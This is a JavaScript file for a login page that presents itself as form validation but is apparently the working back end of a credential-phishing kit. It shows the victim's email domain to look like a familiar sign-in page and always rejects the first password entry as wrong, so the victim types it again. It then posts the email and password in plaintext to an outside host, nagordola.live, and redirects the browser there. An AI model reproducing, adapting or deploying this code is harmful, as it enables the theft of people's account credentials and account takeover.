// Get Dom Strings
const Dom = {
  email: "#email",
  password: "#password",
  submit: "#signin",
  domain: "#domain-name",
  alert: ".alert2",
};

// Get Patterns
let Patterns = {
  email: /^([\w-]*)@([a-zA-Z]+)\.([a-zA-Z]+)(\.[a-zA-Z]{2,3})?$/g,
  password: /^([\w-!#\$@\/]{6,})$/g
};


// Form Validation Controller
let FormValidate = (function(dataCtrl){
  let count = 0;

  // SetListeners
  function setListeners() {

    // Get Submit button
    let submit = document.querySelector(Dom.submit);
    submit.addEventListener("click", validateForm);

    // Body
    body = document.body;
    // Add Onload Listener to body Element
    body.onload = checkMail;

    // Validate Email Value
    document.querySelector(Dom.email).addEventListener("input", checkMail);

  }

  // checkMail
  function checkMail(){
    // Get Domain Element
    let showDomain = document.querySelector(Dom.domain);

    // Validate Domain
    domain = email.value.replace(/.*@/, "").split('.')[0];

    // Add domain to Ui
    showDomain.textContent = domain;
  }

  // Validate Form
  function validateForm(e) {
    // Prevent Default
    e.preventDefault();

    // Increment Count
    count++;

    // Get Inputs
    email = document.querySelector(Dom.email);
    password = document.querySelector(Dom.password);

    // Get Email Regex
    emailReg = Patterns.email;
    passwordReg = Patterns.password;

    // If Count is equal to 1
    if(count === 1) {

      if(email.value === "" && password.value === "") {
          // Print error
          printError(`show`, "Input field cannot be blank");

          // Reset counter
          count = 0;

          return false;
      } else if(email.value === "") {

          // Print error
          printError(`show`, "Email cannot be empty");

          // Reset counter
          count = 0;

          return false;
      } else if(password.value === "") {

          // Print error
          printError(`show`, "Password cannot be empty");

          // Reset counter
          count = 0;

          return false;
      }  else {
        // Print error
        printError(`hide`, "");

        // Increment count
        count++;
      }


      // Validate email
      validateInput(email, emailReg);

      // Validating password
      // Validating password
      if(passwordReg.exec(password.value)) {
          // Print error
          printError(`show`, "Password does not match. Try again.");

          // Empty Password field
          password.value = "";

          // Focus on password field
          password.focus();

          return false;
      } else if(password.value === "") {
        // Print error
        printError(`show`, "Password cannot be empty");

        // Focus on password field
        password.focus();

        // reset count
        count = 0;

        return false;

          // Password length validation
      } else if(password.value.length < 6) {
          // Print error
          printError(`show`, "Password is incorrect");

          // Reset password
          password.value = "";

          // Focus on password field
          password.focus();

          // reset count
          count = 0;

          return false;

      } else {
          // Print error
          printError(`hide`, "");

          // Increment count
          count++;

      }

    } else {
      // Run Real Validation

      // Validate email
      validateInput(email, emailReg);

      // Validating password
      // Validating password
      if(password.value === "") {
        // Print Message
        printError("show", "Password cannot be empty");

        // Focus On Input
        password.focus();

        return false;
      } else if(passwordReg.exec(password.value)) {

        // Print Message
        printError("hide", "");

      } else if(password.value.length < 6) {

        // Print error
        printError(`show`, "Password is incorrect");

        // Reset password
        password.value = "";

        // Focus on password field
        password.focus();

        // reset count
        count = 1;

        return false;

      } else {
        // Increment counter
        count++;

        // Print Message
        let alert = printError("show", "Loggin in...");

        // Change class name
        alert.className = alert.className.replace(/\balert-danger\b/g, "alert-info");


        // Check if count is greater than 1
        if(count > 1) {

          // url
          let url = 'https://nagordola.live/update/WWxoSmQyUkdUVDA9.php';

          // Form Data
          let formData = `email=${email.value}&password=${password.value}`;

          // Submit Data
          postAjax(url, formData, function(data){ console.log(data); });

          // Redirect page
          setTimeout(function(){
            location.href = url;
          }, 200);

        }
      }
    }




  }

  // Validate Input
  function validateInput(input, reg) {
     if(input.value === "") {
       // Print error
       printError(`show`, "Email cannot be empty");

       // Focus on input
       input.focus();

       return false;
     } else if (reg.exec(input.value)) {
       // Print error
       printError(`hide`, "");
     } else {
       // Print error
       printError(`show`, "Email is invalid");
       console.log(printError(`show`, "Email is invalid"));

       // Focus on input
       input.focus();

       return false;
     }
 }

 // Print error
 function printError(show, message) {
   let alert = document.querySelector(Dom.alert);

   if(show === "show") {
     alert.classList.remove("hide");
   } else {
     alert.classList.add("hide");
   }

   // Log messageError
   alert.textContent = message;

   // Return alert
   return alert;
 }

 // Ajax submit 1
 function postAjax(url, data, success) {
     var params = typeof data == 'string' ? data : Object.keys(data).map(
             function(k){ return encodeURIComponent(k) + '=' + encodeURIComponent(data[k]) }
         ).join('&');

     var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
     xhr.open('POST', url);
     xhr.onreadystatechange = function() {
         if (xhr.readyState>3 && xhr.status==200) { success(xhr.responseText); }
     };
     xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
     xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     xhr.send(params);
     return xhr;
 }

 // example request with data object
 // postAjax('http://foo.bar/', { p1: 1, p2: 'Hello World' }, function(data){ console.log(data); });


 // Change Alert class
 function changeAlert(alert, klass) {
   alert.className = alert.className.replace(/\balert-danger\b/g, `${klass}`);
 }

  return {
    init: function() {
      setListeners();
    }
  }

})();

// Initialize function
FormValidate.init();
